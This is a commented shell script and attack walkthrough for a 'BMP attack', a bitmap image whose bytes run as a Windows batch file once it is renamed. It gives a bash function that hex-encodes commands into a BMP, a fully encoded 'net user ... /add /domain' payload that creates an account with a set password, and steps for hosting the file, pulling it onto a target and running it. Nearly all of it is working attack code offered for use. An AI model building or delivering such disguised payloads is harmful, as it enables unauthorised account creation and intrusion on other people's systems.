############################### BMP Attack #####################################
# Attack idea came from 
# https://www.hak5.org/episodes/hak5-925
# MSpaint - make a 1x6 pixel image and zoom in, add the following custom colors, one color per pixel
# 
# RGB value: 10,0,0
# RGB value: 13,10,13
# RGB value: 100,109,99
# RGB value: 120,101,46
# RGB value: 0,0,101
# RGB value: 0,0,0
#
# Save the file 24-bit BMP file, named (anything).bmp, later change file extension to bat to execute....
#
# ----------- hexdump of the original BMP file listed below:
#
0000000 42 4d 4a 00 00 00 00 00 00 00 36 00 00 00 28 00
0000010 00 00 06 00 00 00 01 00 00 00 01 00 18 00 00 00
0000020 00 00 14 00 00 00 00 00 00 00 00 00 00 00 00 00
0000030 00 00 00 00 00 00 00 00 0a 0d 0a 0d             
#
# ----------- Aligned into Hex byte 
#
\x42\x4d\x4a\x00\x00\x00\x00\x00\x00\x00\x36\x00\x00\x00\x28\x00\
\x00\x00\x06\x00\x00\x00\x01\x00\x00\x00\x01\x00\x18\x00\x00\x00\
\x00\x00\x14\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\
\x00\x00\x00\x00\x00\x00\x00\x00\x0a\x0d\x0a\x0d
#
#
# further exploring this - lead me to the discovery or adding additional commands to this since the attack does add 
# cmd.exe to the file, one could simple just... make more impactful commands ...
# the constructor is the baseline attack which enables the cmd prompt -
#
# Bash Function() to help dump string to Hex and produce malicious hex bytes
#
makeattack() {
 constructor="\x42\x4d\x4a\x00\x00\x00\x00\x00\x00\x00\x36\x00\x00\x00\x28\x00\
\x00\x00\x06\x00\x00\x00\x01\x00\x00\x00\x01\x00\x18\x00\x00\x00\
\x00\x00\x14\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\
\x00\x00\x00\x00\x00\x00\x00\x00\x0a\x0d\x0a\x0d"
 trailer=`echo $1 | \
 hexdump -e '16/1 "%02x"' | \
 tr -d " \n" | \
 sed -r 's/(.{2})/\\\x\1/g'`;
 echo $constructor$trailer > $2;
} # Example use: makeattack "/c net user TEST /add"
#
# In addition, this is a test to see if users could be added to a system 
# using the same techniques as described above. Using this string, 
# A new user named testme will be added to the local machine
#
# net user testme r28Wqn90 /add /comment:"Basic user account." /fullname:"Test User" /logonpasswordchg:no /workstations:jr7tww,jr2rtw
# makeattack 'net user testme r28Wqn90 /add /comment:"Basic user account." /fullname:"Test User" /logonpasswordchg:no /workstations:jr7tww,jr2rtw'
#
\x6e\x65\x74\x20\x75\x73\x65\x72\x20\x74\x65\x73\x74\x6d\x65\x20\
\x72\x32\x38\x57\x71\x6e\x39\x30\x20\x2f\x61\x64\x64\x20\x2f\x63\
\x6f\x6d\x6d\x65\x6e\x74\x3a\x22\x42\x61\x73\x69\x63\x20\x75\x73\
\x65\x72\x20\x61\x63\x63\x6f\x75\x6e\x74\x2e\x22\x20\x2f\x66\x75\
\x6c\x6c\x6e\x61\x6d\x65\x3a\x22\x54\x65\x73\x74\x20\x55\x73\x65\
\x72\x22\x20\x2f\x6c\x6f\x67\x6f\x6e\x70\x61\x73\x73\x77\x6f\x72\
\x64\x63\x68\x67\x3a\x6e\x6f\x20\x2f\x77\x6f\x72\x6b\x73\x74\x61\
\x74\x69\x6f\x6e\x73\x3a\x6a\x72\x37\x74\x77\x77\x2c\x6a\x72\x32\
\x72\x74\x77\x20\x2f\x64\x6f\x6d\x61\x69\x6e\x0a
################################################################################
#  Full Attack example of the required hex bytes
#
# makeattack 'net user testme r28Wqn90 /add /comment:"Basic user account." /fullname:"Test User" /logonpasswordchg:no /workstations:jr7tww,jr2rtw /domain'
# shows the following output in hex bytes as one liner, modified to fit here 
#
\x42\x4d\x4a\x00\x00\x00\x00\x00\x00\x00\x36\x00\x00\x00\x28\x00\
\x00\x00\x06\x00\x00\x00\x01\x00\x00\x00\x01\x00\x18\x00\x00\x00\
\x00\x00\x14\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\
\x00\x00\x00\x00\x00\x00\x00\x00\x0a\x0d\x0a\x0d\x6e\x65\x74\x20\
\x75\x73\x65\x72\x20\x74\x65\x73\x74\x6d\x65\x20\x72\x32\x38\x57\
\x71\x6e\x39\x30\x20\x2f\x61\x64\x64\x20\x2f\x63\x6f\x6d\x6d\x65\
\x6e\x74\x3a\x22\x42\x61\x73\x69\x63\x20\x75\x73\x65\x72\x20\x61\
\x63\x63\x6f\x75\x6e\x74\x2e\x22\x20\x2f\x66\x75\x6c\x6c\x6e\x61\
\x6d\x65\x3a\x22\x54\x65\x73\x74\x20\x55\x73\x65\x72\x22\x20\x2f\
\x6c\x6f\x67\x6f\x6e\x70\x61\x73\x73\x77\x6f\x72\x64\x63\x68\x67\
\x3a\x6e\x6f\x20\x2f\x77\x6f\x72\x6b\x73\x74\x61\x74\x69\x6f\x6e\
\x73\x3a\x6a\x72\x37\x74\x77\x77\x2c\x6a\x72\x32\x72\x74\x77\x20\
\x2f\x64\x6f\x6d\x61\x69\x6e\x0a
#
# now use the following command to produce the required BMP
# echo -e "\xAT\xTA\xCK\xST\xRI\xNG\xHE\xRE" > /var/www/html/testme.bmp
# move file to system by any means (IE: host it on a web server and call the page from the target system)
# find the file on the target system's cache 
# change the extension as mentioned and execute it ....
################################################################################
